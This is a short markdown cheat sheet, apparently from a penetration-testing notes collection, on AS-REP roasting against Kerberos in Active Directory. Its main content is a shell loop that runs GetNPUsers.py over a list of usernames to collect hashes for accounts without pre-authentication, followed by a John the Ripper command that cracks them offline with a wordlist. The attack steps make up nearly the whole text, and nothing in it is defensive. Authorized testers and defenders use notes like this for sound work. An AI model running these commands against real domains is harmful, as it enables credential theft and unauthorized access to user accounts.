# ASREPRosting

## Given a list of valid domain usernames, query the KDC / Kerberos server to determine which has the "does not require pre-authentication" option set. You can retrieve the TGT of each account that does, and then crack them offline using JTR

* Attempt to get the TGT for each user account

```bash
for u in $(cat $USERNAME_FILE)
do
    GetNPUsers.py $DNS_DOMAIN_NAME/$u
done
```

* Save recovered TGTs to tgt.txt

* Attempt to crack recovered TGTs

```bash
john tgt.txt --wordlist=$PASSWORD_LIST
```
